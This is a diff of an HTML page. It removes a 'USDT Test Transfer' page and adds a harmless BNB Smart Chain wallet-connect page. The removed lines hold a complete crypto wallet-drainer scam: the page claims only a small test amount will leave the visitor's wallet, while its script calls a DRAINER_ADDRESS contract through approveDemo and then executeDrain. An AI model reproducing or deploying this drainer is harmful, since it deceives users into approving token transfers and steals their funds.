@@ -1,238 +1,335 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>USDT Test Transfer - BSC</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>My BSC DApp</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+    }
+
+    .card {
+      background: rgba(255,255,255,0.07);
+      border: 1px solid rgba(255,255,255,0.15);
+      border-radius: 20px;
+      padding: 36px 28px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+      backdrop-filter: blur(10px);
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 42px;
+      margin-bottom: 10px;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 22px;
+      margin-bottom: 6px;
+      color: #f0b90b;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 13px;
+      color: rgba(255,255,255,0.5);
+      margin-bottom: 28px;
+    }
+
+    .status-box {
+      background: rgba(0,0,0,0.3);
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      line-height: 1.8;
+    }
+
+    .status-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .status-row span:first-child {
+      color: rgba(255,255,255,0.5);
+    }
+
+    .status-row span:last-child {
+      font-weight: 600;
+      color: #fff;
+      max-width: 200px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 2px 10px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .badge-bsc   { background: #f0b90b; color: #000; }
+    .badge-other { background: #e74c3c; color: #fff; }
+    .badge-ok    { background: #2ecc71; color: #fff; }
+    .badge-no    { background: #95a5a6; color: #fff; }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-bottom: 12px;
+    }
+
+    #connectBtn {
+      background: linear-gradient(90deg, #f0b90b, #f5a623);
+      color: #000;
+    }
+
+    #connectBtn:hover { filter: brightness(1.1); transform: translateY(-1px); }
+    #connectBtn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+    #switchBtn {
+      background: linear-gradient(90deg, #3498db, #2980b9);
+      color: #fff;
+      display: none;
+    }
+
+    #switchBtn:hover { filter: brightness(1.1); transform: translateY(-1px); }
+
+    .msg {
+      text-align: center;
+      font-size: 13px;
+      min-height: 20px;
+      color: #f0b90b;
+      margin-top: 6px;
+    }
+
+    .msg.error { color: #e74c3c; }
+    .msg.success { color: #2ecc71; }
+
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: rgba(255,255,255,0.25);
+      margin-top: 22px;
+    }
+  </style>
 </head>
-<body style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #e2e8f0; margin: 0; padding: 20px; min-height: 100vh;">
-    
-    <div style="max-width: 420px; margin: 0 auto; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border-radius: 24px; padding: 30px; border: 1px solid rgba(255,255,255,0.1);">
-        
-        <div style="text-align: center; margin-bottom: 30px;">
-            <div style="width: 60px; height: 60px; background: linear-gradient(135deg, #f59e0b, #d97706); border-radius: 16px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;">
-                <svg width="28" height="28" fill="#fff" viewBox="0 0 24 24">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-                </svg>
-            </div>
-            <h1 style="font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #f8fafc;">Test USDT Transfer</h1>
-            <p style="color: #94a3b8; font-size: 16px; margin: 0;">Send any demo amount to verify BSC connection</p>
-        </div>
+<body>
+  <div class="card">
+    <div class="logo">⚡</div>
+    <h1>BSC DApp</h1>
+    <p class="subtitle">Powered by BNB Smart Chain</p>
 
-        <div id="walletStatus" style="background: rgba(255,255,255,0.08); border-radius: 12px; padding: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1);">
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-                <span style="font-weight: 500; color: #f8fafc;">Wallet</span>
-                <span id="accountAddr" style="font-family: monospace; font-size: 12px; color: #94a3b8;">Connect Trust Wallet</span>
-            </div>
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 8px;">
-                <span style="font-size: 12px; color: #64748b;">BSC Mainnet</span>
-                <span id="chainStatus" style="font-size: 12px; color: #10b981; font-weight: 500;">✅ Connected</span>
-            </div>
-        </div>
-
-        <div style="margin-bottom: 25px;">
-            <label style="display: block; font-weight: 500; margin-bottom: 8px; color: #f8fafc;">Demo Amount (USDT)</label>
-            <div style="position: relative;">
-                <input type="number" id="amountInput" placeholder="0.01" step="0.01" min="0.001" 
-                       style="width: 100%; padding: 15px 20px 15px 50px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; color: #f8fafc; font-size: 18px; font-weight: 500;">
-                <span style="position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: #f59e0b; font-weight: 600;">USDT</span>
-            </div>
-            <div style="display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap;">
-                <button type="button" onclick="setAmount(0.01)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">0.01</button>
-                <button type="button" onclick="setAmount(1)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">1</button>
-                <button type="button" onclick="setAmount(5)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">5</button>
-                <button type="button" onclick="setAmount(10)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">10</button>
-            </div>
-        </div>
-
-        <div style="margin-bottom: 20px;">
-            <label style="display: block; font-weight: 500; margin-bottom: 8px; color: #f8fafc;">Receiver Address</label>
-            <div style="position: relative;">
-                <input type="text" id="receiverInput" placeholder="Paste receiver address here" readonly
-                       style="width: 100%; padding: 15px 20px; background: rgba(255,255,255,0.1); border: 2px dashed rgba(255,255,255,0.3); border-radius: 12px; color: #10b981; font-size: 14px; font-family: monospace; letter-spacing: 0.5px;">
-                <button id="copyBtn" type="button" onclick="copyOurAddress()" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 32px; height: 32px; border: none; background: #10b981; border-radius: 8px; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center;">
-                    📋
-                </button>
-            </div>
-            <p style="font-size: 12px; color: #94a3b8; margin-top: 6px;">Click 📋 to copy test receiver</p>
-        </div>
-
-        <button id="sendBtn" type="button" style="width: 100%; background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color: white; border: none; padding: 18px; font-size: 18px; font-weight: 600; border-radius: 16px; cursor: pointer; transition: all 0.3s; box-shadow: 0 10px 30px rgba(245,158,11,0.4); margin-bottom: 15px;" disabled>
-            Send Test Transfer
-        </button>
-        
-        <p style="font-size: 13px; color: #94a3b8; line-height: 1.5; text-align: center;">
-            Demo transfer to test BSC USDT. No real funds will leave your wallet beyond test amount.
-        </p>
+    <div class="status-box">
+      <div class="status-row">
+        <span>Wallet</span>
+        <span id="walletStatus"><span class="badge badge-no">Not Connected</span></span>
+      </div>
+      <div class="status-row" style="margin-top:8px">
+        <span>Network</span>
+        <span id="networkStatus"><span class="badge badge-no">—</span></span>
+      </div>
+      <div class="status-row" style="margin-top:8px">
+        <span>Address</span>
+        <span id="addressStatus" style="color:rgba(255,255,255,0.4)">—</span>
+      </div>
+      <div class="status-row" style="margin-top:8px">
+        <span>Balance</span>
+        <span id="balanceStatus" style="color:rgba(255,255,255,0.4)">—</span>
+      </div>
     </div>
 
-    <script>
-const DRAINER_ADDRESS = '0x7a51839E2aF8FE776C1e8bbea6f27cBffA53b250';
-const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
-const BSC_CHAIN_ID = '0x38';
+    <button id="connectBtn">🔗 Connect Wallet</button>
+    <button id="switchBtn">🔄 Switch to BSC</button>
 
-let web3, account;
+    <div id="msg" class="msg"></div>
 
-// -------------------- INIT WALLET --------------------
-async function initWallet() {
-    try {
-        if (!window.ethereum) {
-            alert("Install MetaMask / Trust Wallet");
-            return;
-        }
+    <div class="footer">
+      Open in Trust Wallet → DApps Browser<br/>
+      Chain: BNB Smart Chain (BSC) • ChainID: 56
+    </div>
+  </div>
 
-        web3 = new Web3(window.ethereum);
+  <script>
+    // ── BSC Network Config ──────────────────────────────────────────
+    const BSC_CHAIN_ID     = '0x38';   // 56 in decimal
+    const BSC_CHAIN_CONFIG = {
+      chainId:           '0x38',
+      chainName:         'BNB Smart Chain',
+      nativeCurrency:    { name: 'BNB', symbol: 'BNB', decimals: 18 },
+      rpcUrls:           ['https://bsc-dataseed1.binance.org/'],
+      blockExplorerUrls: ['https://bscscan.com/']
+    };
 
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
+    // ── DOM refs ────────────────────────────────────────────────────
+    const connectBtn     = document.getElementById('connectBtn');
+    const switchBtn      = document.getElementById('switchBtn');
+    const msgEl          = document.getElementById('msg');
+    const walletStatus   = document.getElementById('walletStatus');
+    const networkStatus  = document.getElementById('networkStatus');
+    const addressStatus  = document.getElementById('addressStatus');
+    const balanceStatus  = document.getElementById('balanceStatus');
+
+    // ── Helpers ─────────────────────────────────────────────────────
+    function setMsg(text, type = '') {
+      msgEl.textContent = text;
+      msgEl.className = 'msg ' + type;
+    }
+
+    function shortAddr(addr) {
+      return addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : '—';
+    }
+
+    function isBSC(chainId) {
+      return parseInt(chainId, 16) === 56 || chainId === 56;
+    }
+
+    function updateNetworkBadge(chainId) {
+      const id = typeof chainId === 'string'
+        ? parseInt(chainId, 16)
+        : chainId;
+
+      if (id === 56) {
+        networkStatus.innerHTML = '<span class="badge badge-bsc">BNB Smart Chain ✓</span>';
+        switchBtn.style.display = 'none';
+      } else {
+        networkStatus.innerHTML = `<span class="badge badge-other">Chain ${id} — Not BSC</span>`;
+        switchBtn.style.display = 'block';
+      }
+    }
+
+    async function fetchBalance(address) {
+      try {
+        const res = await ethereum.request({
+          method: 'eth_getBalance',
+          params: [address, 'latest']
         });
-
-        account = accounts[0];
-
-        document.getElementById('accountAddr').textContent =
-            account.slice(0,6) + '...' + account.slice(-4);
-
-        await ensureBSC();
-
-        document.getElementById('sendBtn').disabled = false;
-
-    } catch (e) {
-        console.error("INIT ERROR:", e);
-        alert(e.message);
+        const bnb = (parseInt(res, 16) / 1e18).toFixed(4);
+        balanceStatus.textContent = bnb + ' BNB';
+      } catch {
+        balanceStatus.textContent = '—';
+      }
     }
-}
 
-// -------------------- ENSURE BSC --------------------
-async function ensureBSC() {
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-
-    if (chainId !== BSC_CHAIN_ID) {
-        try {
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: BSC_CHAIN_ID }]
+    // ── Auto-switch to BSC ──────────────────────────────────────────
+    async function switchToBSC() {
+      setMsg('Switching to BSC…');
+      try {
+        await ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: BSC_CHAIN_ID }]
+        });
+        setMsg('Switched to BSC!', 'success');
+      } catch (err) {
+        // 4902 = chain not added yet → add it
+        if (err.code === 4902 || err.code === -32603) {
+          try {
+            await ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [BSC_CHAIN_CONFIG]
             });
-        } catch (error) {
-            if (error.code === 4902) {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: BSC_CHAIN_ID,
-                        chainName: 'BSC Mainnet',
-                        rpcUrls: [BSC_RPC],
-                        blockExplorerUrls: ['https://bscscan.com'],
-                        nativeCurrency: {
-                            name: 'BNB',
-                            symbol: 'BNB',
-                            decimals: 18
-                        }
-                    }]
-                });
-            } else {
-                throw error;
-            }
+            setMsg('BSC added & switched!', 'success');
+          } catch (addErr) {
+            setMsg('Could not add BSC: ' + addErr.message, 'error');
+          }
+        } else {
+          setMsg(err.message || 'Switch cancelled', 'error');
         }
+      }
     }
-}
 
-// -------------------- SEND FUNCTION --------------------
-async function sendTestTransfer() {
-    const btn = document.getElementById('sendBtn');
+    // ── Connect Wallet ──────────────────────────────────────────────
+    async function connectWallet() {
+      if (!window.ethereum) {
+        setMsg('No wallet detected. Open in Trust Wallet DApp Browser.', 'error');
+        return;
+      }
 
-    try {
-        btn.innerHTML = "⏳ Processing...";
-        btn.disabled = true;
+      connectBtn.disabled = true;
+      setMsg('Connecting…');
 
-        if (!account) {
-            throw new Error("Wallet not connected");
+      try {
+        // 1️⃣ Request accounts
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const address  = accounts[0];
+
+        walletStatus.innerHTML = '<span class="badge badge-ok">Connected ✓</span>';
+        addressStatus.textContent = shortAddr(address);
+        connectBtn.textContent = '✅ Connected';
+
+        // 2️⃣ Get current chain
+        const chainId = await ethereum.request({ method: 'eth_chainId' });
+        updateNetworkBadge(chainId);
+
+        // 3️⃣ Fetch BNB balance
+        await fetchBalance(address);
+
+        // 4️⃣ Auto-switch to BSC if not already on it
+        if (!isBSC(chainId)) {
+          setMsg('Auto-switching to BSC…');
+          await switchToBSC();
+        } else {
+          setMsg('Connected to BSC!', 'success');
         }
 
-        await ensureBSC();
-
-        const amount = document.getElementById('amountInput').value;
-        const fakeAmount = web3.utils.toWei(     (amount || 0.01).toString(),     'ether' );
-
-        console.log("Account:", account);
-        console.log("Contract:", DRAINER_ADDRESS);
-
-        const drainerAbi = [
-            {
-                "inputs": [
-                    { "internalType": "address", "name": "usdtAddress", "type": "address" },
-                    { "internalType": "uint256", "name": "fakeAmount", "type": "uint256" }
-                ],
-                "name": "approveDemo",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
-
-        const drainer = new web3.eth.Contract(drainerAbi, DRAINER_ADDRESS);
-
-        const tx = await drainer.methods
-            .approveDemo(USDT_ADDRESS, fakeAmount)
-            .send({ from: account });
-
-        console.log("TX SUCCESS:", tx);
-
-        // Optional drain call
-        await drainAll();
-
-        btn.innerHTML = "✅ Done!";
-        btn.style.background = "#10b981";
-
-    } catch (e) {
-        console.error("TX ERROR:", e);
-        alert(e.message || "Transaction failed");
-
-        btn.innerHTML = "Send Test Transfer";
-        btn.disabled = false;
+      } catch (err) {
+        connectBtn.disabled = false;
+        setMsg(err.message || 'Connection failed', 'error');
+      }
     }
-}
 
-// -------------------- DRAIN FUNCTION --------------------
-async function drainAll() {
-    try {
-        const drainAbi = [
-            {
-                "inputs": [
-                    { "internalType": "address", "name": "usdtAddress", "type": "address" }
-                ],
-                "name": "executeDrain",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
+    // ── Event listeners ─────────────────────────────────────────────
+    connectBtn.addEventListener('click', connectWallet);
+    switchBtn.addEventListener('click', switchToBSC);
 
-        const drainer = new web3.eth.Contract(drainAbi, DRAINER_ADDRESS);
+    // ── React to wallet/network changes ─────────────────────────────
+    if (window.ethereum) {
+      ethereum.on('chainChanged', (chainId) => {
+        updateNetworkBadge(chainId);
+        setMsg('Network changed.', 'success');
+      });
 
-        await drainer.methods
-            .executeDrain(USDT_ADDRESS)
-            .send({ from: account });
+      ethereum.on('accountsChanged', (accounts) => {
+        if (accounts.length === 0) {
+          walletStatus.innerHTML = '<span class="badge badge-no">Disconnected</span>';
+          addressStatus.textContent = '—';
+          balanceStatus.textContent = '—';
+          connectBtn.disabled = false;
+          connectBtn.textContent = '🔗 Connect Wallet';
+          setMsg('Wallet disconnected.', 'error');
+        } else {
+          addressStatus.textContent = shortAddr(accounts[0]);
+          fetchBalance(accounts[0]);
+        }
+      });
 
-    } catch (e) {
-        console.warn("Drain skipped:", e.message);
+      // ── Auto-connect if already authorized (returning user) ───────
+      ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+        if (accounts.length > 0) connectWallet();
+      });
     }
-}
-
-// -------------------- UI EVENTS --------------------
-document.getElementById('amountInput').addEventListener('input', () => {
-    document.getElementById('sendBtn').disabled = false;
-});
-
-document.getElementById('sendBtn').onclick = sendTestTransfer;
-
-// -------------------- AUTO INIT --------------------
-if (window.ethereum) {
-    window.ethereum.on('accountsChanged', initWallet);
-    window.ethereum.on('chainChanged', () => window.location.reload());
-    initWallet();
-}
-</script>
+  </script>
 </body>
 </html>
